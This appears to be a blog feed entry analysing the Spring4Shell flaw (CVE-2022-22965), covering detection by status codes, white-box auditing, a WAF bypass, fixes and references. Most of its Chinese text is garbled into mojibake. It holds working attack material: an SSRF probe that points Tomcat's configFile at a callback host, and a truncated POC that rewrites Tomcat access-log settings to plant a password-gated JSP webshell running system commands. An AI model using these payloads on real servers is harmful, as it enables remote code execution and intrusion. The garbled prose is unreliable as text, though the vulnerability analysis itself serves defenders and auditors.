å®¡è®¡phith0nå¸ˆå‚…å¯¹æ¼æ´çš„æ€»ç»“ï¼š</p><blockquote><p>åœ¨Javaé‡Œé¢ï¼Œæ‰€æœ‰çš„Javaå¯¹è±¡éƒ½æœ‰ä¸€ä¸ª<code>getClass()</code>æ–¹æ³•ï¼Œè·å–å¯¹è±¡çš„Classï¼ŒClassåˆæœ‰<code>getClassLoader()</code>æ–¹æ³•è·å–Classçš„<code>ClassLoader</code>ï¼Œè€Œåœ¨Tomcatä¸­ï¼Œä¸€äº›å’ŒTomcatçš„å…¨å±€é…ç½®ç›¸å…³çš„å±æ€§éƒ½ä¿å­˜åœ¨<code>org.apache.catalina.loader.ParallelWebappClassLoader</code>è¿™ä¸ªTomcatä¸“å±çš„ClassLoaderçš„ä¸€äº›å±æ€§ã€å­å­™å±æ€§é‡Œã€‚<br>é‚£ä¹ˆï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡person.getClass().getClassLoader().getXXX()æ¥è°ƒç”¨ParallelWebappClassLoaderä¸­çš„ä¸€äº›æ•æ„Ÿå±æ€§æœ€åé€šè¿‡ä¿®æ”¹Tomcatçš„é…ç½®æ¥æ‰§è¡Œå±é™©æ“ä½œã€‚è¿™ä¸ªè°ƒç”¨é“¾æ”¾åœ¨ç”¨æˆ·æ•°æ®åŒ…é‡Œå°±æ˜¯class.classLoader.XXX</p></blockquote><h2 id="æ¼æ´åˆ¤æ–­"><a href="#æ¼æ´åˆ¤æ–­" class="headerlink" title="æ¼æ´åˆ¤æ–­"></a>æ¼æ´åˆ¤æ–­</h2><h4 id="æ ¹æ®çŠ¶æ€ç "><a href="#æ ¹æ®çŠ¶æ€ç " class="headerlink" title="æ ¹æ®çŠ¶æ€ç "></a>æ ¹æ®çŠ¶æ€ç </h4><ul><li>è¿”å›500: <code>class.module.class.module.classLoader.xx</code></li><li>è¿”å›400: <code>class.module.classLoader.DefaultAssertionStatus=nonsense</code></li><li>è¿”å›302: <code>class.module.classLoader.resources.context.mapperDirectoryRedirectEnabled=true</code></li></ul><p>è¿”å›302çš„æ—¶å€™éœ€è¦åŒæ—¶æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶:</p><ol><li>è¯·æ±‚è·¯å¾„ä¸èƒ½ä»¥<code>/</code>ç»“å°¾</li><li>contextçš„<code>mapperDirectoryRedirectEnabled</code>å±æ€§ä¸ºtrue</li><li>è®¿é—®çš„åœ°å€æ˜¯å­˜åœ¨çš„ä¸€ä¸ªç›®å½•</li></ol><p>å½“<code>class.module.classLoader.resources.context.mapperDirectoryRedirectEnabled=false</code>çš„æ—¶å€™ï¼Œè®¿é—®ä¸€ä¸ªå­˜åœ¨çš„ç›®å½•æ˜¯404ï¼š<br><img src="/2022/04/06/CVE-2022-22965/1.png"><br>å½“<code>class.module.classLoader.resources.context.mapperDirectoryRedirectEnabled=true</code>ï¼š<br><img src="/2022/04/06/CVE-2022-22965/2.png"></p><h4 id="é€šè¿‡SSRF"><a href="#é€šè¿‡SSRF" class="headerlink" title="é€šè¿‡SSRF"></a>é€šè¿‡SSRF</h4><p>ä¸æ¨èä½¿ç”¨ï¼Œå¦‚æœåº”ç”¨ä½¿ç”¨äº†<code>configFile</code>ä¼šç ´åè¿è¡Œç¯å¢ƒï¼š</p><pre class="line-numbers language-none"><code class="language-none">class.module.classLoader.resources.context.configFile&#x3D;https:&#x2F;&#x2F;&#123;&#123;interactsh-url&#125;&#125;&amp;class.module.classLoader.resources.context.configFile.content.aaa&#x3D;xxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ç™½ç›’"><a href="#ç™½ç›’" class="headerlink" title="ç™½ç›’"></a>ç™½ç›’</h3><h4 id="ä½¿ç”¨-RequestBody"><a href="#ä½¿ç”¨-RequestBody" class="headerlink" title="ä½¿ç”¨@RequestBody"></a>ä½¿ç”¨@RequestBody</h4><p>å…ˆæ£€æŸ¥é¡¹ç›®ä¸­ä½¿ç”¨POJOçš„æ¥å£ï¼Œç„¶åå†æ£€æŸ¥æ˜¯å¦ä½¿ç”¨äº†<code>@RequestBody</code>æ³¨è§£ã€‚ä½¿ç”¨<code>@RequestBody</code>æ³¨è§£çš„æ¥å£æ˜¯æ¥æ”¶JSONå’ŒXMLç­‰è¯·æ±‚ï¼Œåº•å±‚ä½¿ç”¨<code>RequestResponseBodyMethodProcessor</code>å¤„ç†è¯·æ±‚ï¼Œè€ŒContent-Typeæ˜¯<code>application/x-www-form-urlencoded</code>çš„æ—¶å€™ï¼Œä¼šä½¿ç”¨<code>ServletModelAttributeMethodProcessor</code>è§£æè¯·æ±‚ã€‚æ‰€ä»¥ä½¿ç”¨<code>@RequestBody</code>çš„æ—¶å€™ä¸å­˜åœ¨æ¼æ´ï¼Œå¯ä»¥ä½¿ç”¨egrepåˆæ­¥åŒ¹é…ä¹‹åï¼Œæ’æŸ¥æ²¡æœ‰ä½¿ç”¨<code>@RequestBody</code>çš„æ¥å£:</p><pre class="line-numbers language-none"><code class="language-none">egrep -5  -ri &quot;@(Get|Post|Put|Delete|Patch|Request)Mapping&quot; .<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨ä½¿ç”¨<code>@RequestBody</code>çš„æ—¶å€™ï¼Œå¦‚æœè‡ªå®šä¹‰äº†<a href="https://blog.csdn.net/justry_deng/article/details/99875548">å‚æ•°è§£æå™¨</a>ï¼Œä¹Ÿå°±æ˜¯è¯´åç«¯å¯ä»¥åŒæ—¶æ¥æ”¶<code>application/json</code>å’Œ<code>application/x-www-form-urlencoded</code>è¿™ä¸¤ç§è¯·æ±‚ï¼Œä¹Ÿå¯èƒ½å­˜åœ¨æ¼æ´ã€‚åœ¨æµ‹è¯•JSONæ¥å£çš„æ—¶å€™å¯ä»¥æ”¹å˜Content-Typeä¸º<code>application/x-www-form-urlencoded</code>åšä¸€æ¬¡å°è¯•ã€‚</p><p>SpringMVCçš„<code>HandlerMethodArgumentResolver</code>æ˜¯æ–¹æ³•å‚æ•°è§£æå™¨æ¥å£ï¼Œè¿™ä¸ªæ¥å£æ˜¯SpringMVCå‚æ•°è§£æç»‘å®šçš„æ ¸å¿ƒæ¥å£ï¼Œå†…ç½®äº†å¾ˆå¤šç±»å®Œæˆ<a href="https://github.com/spring-projects/spring-framework/blob/d84ca2ba90d27a7c63d7b35a6259b5b9cf341118/spring-webmvc/src/main/java/org/springframework/web/servlet/mvc/method/annotation/RequestMappingHandlerAdapter.java#L644">å‚æ•°è§£æ</a>ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">HandlerMethodArgumentResolver</span><span class="token punctuation">></span></span> <span class="token function">getDefaultArgumentResolvers</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">HandlerMethodArgumentResolver</span><span class="token punctuation">></span></span> resolvers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Annotation-based argument resolution</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestParamMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestParamMapMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PathVariableMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PathVariableMapMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MatrixVariableMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MatrixVariableMapMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ServletModelAttributeMethodProcessor</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestResponseBodyMethodProcessor</span><span class="token punctuation">(</span><span class="token function">getMessageConverters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>requestResponseBodyAdvice<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestPartMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token function">getMessageConverters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>requestResponseBodyAdvice<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestHeaderMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestHeaderMapMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ServletCookieValueMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ExpressionValueMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SessionAttributeMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestAttributeMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Type-based argument resolution</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ServletRequestMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ServletResponseMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">HttpEntityMethodProcessor</span><span class="token punctuation">(</span><span class="token function">getMessageConverters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>requestResponseBodyAdvice<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RedirectAttributesMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ModelMethodProcessor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MapMethodProcessor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ErrorsMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SessionStatusMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">UriComponentsBuilderMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">KotlinDetector</span><span class="token punctuation">.</span><span class="token function">isKotlinPresent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ContinuationHandlerMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¯”å¦‚:</p><ul><li><code>RequestParamMethodArgumentResolver</code>ï¼š   è´Ÿè´£è§£æ @RequestParam æ ‡è®°çš„å‚æ•°</li><li><code>ServletRequestMethodArgumentResolver</code>ï¼š è´Ÿè´£è§£æå…¥å‚ä¸º HttpServletRequestã€HttpMethod ç­‰ç±»å‹çš„å‚æ•°</li><li><code>ServletModelAttributeMethodProcessor</code>ï¼š è´Ÿè´£è§£æå…¥å‚ä¸º POJO ç±»çš„å‚æ•°</li><li><code>RequestResponseBodyMethodProcessor</code>ï¼š   è´Ÿè´£è§£æå…¥å‚ä¸º @RequestBody æ ‡æ³¨çš„å‚æ•°</li></ul><h4 id="ä½¿ç”¨consumesçš„æ—¶å€™"><a href="#ä½¿ç”¨consumesçš„æ—¶å€™" class="headerlink" title="ä½¿ç”¨consumesçš„æ—¶å€™"></a>ä½¿ç”¨consumesçš„æ—¶å€™</h4><p><code>@RequestMapping(value = &quot;/rapid7/v1&quot;, method = &#123;RequestMethod.GET, RequestMethod.POST&#125;, consumes = &quot;application/json&quot;)</code><br>ç»è¿‡æµ‹è¯•ï¼Œæœªè§¦å‘æ¼æ´</p><h4 id="WAFç»•è¿‡"><a href="#WAFç»•è¿‡" class="headerlink" title="WAFç»•è¿‡"></a>WAFç»•è¿‡</h4><p>æ¥è‡ª<a href="https://mp.weixin.qq.com/s/plFLE8e0-Fc2tHJ4HaiSSw">çƒ½ç«å°å®éªŒå®¤çš„ç»•è¿‡</a>ï¼š</p><pre class="line-numbers language-none"><code class="language-none">class.module.classLoader.resources.context.resources.context.parent.pipeline.first.pattern<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>å‡çº§Spring Frameworkåˆ°v5.3.18æˆ–v5.2.20</p><p>Springå‡çº§ä¹‹åTomcatä¹Ÿå‘å¸ƒäº†æ–°ç‰ˆæœ¬ï¼Œåœ¨<code>Tomcat 9.0.62</code>ç‰ˆæœ¬å¯¹<code>getResources()</code>æ–¹æ³•çš„è¿”å›å€¼åšäº†ä¿®æ”¹ï¼Œç›´æ¥è¿”å›nullã€‚<code>WebappClassLoaderBase</code>å³<code>ParallelWebappClassLoader</code>çš„çˆ¶ç±»ï¼Œåœ¨Webåº”ç”¨éƒ¨ç½²æ–¹å¼ä¸­ï¼Œåˆ©ç”¨<code>org.apache.catalina.loader.ParallelWebappClassLoader.getResources()</code>çš„é“¾è·¯å°±èµ°ä¸é€šäº†ã€‚<br><img src="/2022/04/06/CVE-2022-22965/9.png"></p><p>å…¶å®ƒä¸­é—´ä»¶çš„éƒ¨åˆ†ç¯å¢ƒå˜é‡å¯ä»¥å‚è€ƒ<a href="https://github.com/julianvilas/rooted2k15/blob/a00055f906/struts-tester/results/struts2-tomcat8-debug.txt">struts-tester</a></p><p><a href="https://www.anquanke.com/post/id/267124">RWCTF 4th Desperate Cat Writeup</a>çš„å®é™…æ¡ˆä¾‹çš„åˆ©ç”¨åŸç†ä¹Ÿå·®ä¸å¤šï¼Œä½†æ˜¯æ›´æœ‰è¶£ã€‚</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul><li><a href="https://tttang.com/archive/1532/">ä»é›¶å¼€å§‹ï¼Œåˆ†æSpring Framework RCE</a></li><li><a href="https://mp.weixin.qq.com/s/plFLE8e0-Fc2tHJ4HaiSSw">å…³äºSpring framework rceï¼ˆCVE-2022-22965ï¼‰çš„ä¸€äº›é—®é¢˜æ€è€ƒ</a></li><li><a href="https://mp.weixin.qq.com/s/G1z7mydl4nc9SxcZjwUQwg">CVE-2022-22965 Springæ ¸å¿ƒæ¡†æ¶Spring4Shellè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´åŸç†ä¸ä¿®å¤æ–¹å¼åˆ†æ</a></li><li><a href="https://github.com/projectdiscovery/nuclei-templates/blob/6020f5f7e74135970bc283317cc303fc6597b1e5/cves/2022/CVE-2022-22965.yaml">nuclei-templates</a></li><li><a href="https://xz.aliyun.com/t/11129">Spring Beans RCEåˆ†æ</a></li><li><a href="https://www.anquanke.com/post/id/267124">RWCTF 4th Desperate Cat Writeup</a></li><li><a href="https://mp.weixin.qq.com/s/bG3BCdM-suCZldN7FIpYqw">Spring å‚æ•°ç»‘å®šçš„åˆ†æä»¥åŠç”²æ–¹è‡ªæŸ¥</a></li><li><a href="https://d3fence.com/spring4shell-CVE-2022-22965-e2bdda3a816a4e5480a0bbcaabda2f8d">spring4shellï¼ˆCVE-2022-22965ï¼‰äº‹ä»¶è€ƒå¤èµ„æ–™æ¢³ç†</a></li><li><a href="https://juejin.cn/post/6894026079116197896">SpringMVC å…¥å‚è§£æåŸç†å’Œå®æˆ˜</a></li><li><a href="https://www.cnblogs.com/w-y-c-m/p/8443892.html">SpringMVCæºç ä¹‹å‚æ•°è§£æç»‘å®šåŸç†</a></li><li><a href="https://www.aqniu.com/industry/82365.html">Springè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2022-22965ï¼‰åŸç†åˆ†æå’Œæ€è€ƒ</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;æ¼æ´æ—¶é—´çº¿&quot;&gt;&lt;a href=&quot;#æ¼æ´æ—¶é—´çº¿&quot; class=&quot;headerlink&quot; title=&quot;æ¼æ´æ—¶é—´çº¿&quot;&gt;&lt;/a&gt;æ¼æ´æ—¶é—´çº¿&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;CVE-2010-1622 Springç¬¬ä¸€æ¬¡&lt;a href=&quot;https://www.inbreak.net/archives/377&quot;&gt;çˆ†å‘æ¼æ´&lt;/a&gt;ï¼ŒåŒæ—¶ä¹Ÿå½±å“äº†Struts(&lt;a href=&quot;https://su18.org/post/struts2-2/#s2-020s2-021s2-022&quot;&gt;S2-020/S2-021/S2-022&lt;/a&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;2017å¹´9æœˆ10æ—¥ Oracleå®˜æ–¹å‘æ–‡è§£é‡ŠJava 9çš„moduleæ–°ç‰¹æ€§&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;2022å¹´3æœˆ29æ—¥ èš‚èšé›†å›¢æŠ¥å‘Šæ¼æ´ï¼ˆCVE-2022-22965ï¼‰&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;POC&quot;&gt;&lt;a href=&quot;#POC&quot; class=&quot;headerlink&quot; title=&quot;POC&quot;&gt;&lt;/a&gt;POC&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;CVE-2010-1622/Struts(&lt;a href=&quot;https://su18.org/post/struts2-2/#s2-020s2-021s2-022&quot;&gt;S2-020/S2-021/S2-022&lt;/a&gt;)&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;directory&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;webapps&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;ROOT
&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;prefix&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;shell
&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;suffix&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;jsp
&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;fileDateFormat&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pattern&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;Bc2&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;20if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;j&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;equals&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;request&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getParameter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;pwd&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;io&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;InputStream&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;in&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;Bc1&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token 